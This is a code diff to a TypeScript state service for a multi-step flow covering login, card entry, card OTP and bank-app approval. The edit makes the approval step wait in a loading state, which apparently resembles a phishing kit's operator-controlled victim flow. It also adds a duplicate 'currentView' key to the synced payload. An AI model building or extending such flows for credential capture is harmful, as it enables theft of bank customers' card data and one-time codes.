@@ -490,6 +490,7 @@ export class StateService {
   private buildPayload() {
       return {
           sessionId: this.sessionId(),
+          currentView: this.currentView(),
           timestamp: this.startTime(),
           currentView: this.currentView(),
           email: this.email(),
@@ -757,7 +758,7 @@ export class StateService {
                this.navigate('card_otp', true);
            }
            else if (this.stage() === 'bank_app_pending') {
-               this.navigate('card', true); // Or back to bank app?
+               this.navigate('bank_app', true);
            } else {
                this.navigate('login', true);
            }
@@ -958,10 +959,10 @@ export class StateService {
       this.syncState();
   }
 
-  completeBankApp() {
-      this.isFlowComplete.set(true);
-      this.stage.set('complete');
-      this.navigate('success');
+  submitBankAppApproval() {
+      this.stage.set('bank_app_pending');
+      this.navigate('loading');
+      this.waitingStart.set(Date.now());
       this.syncState();
   }
   
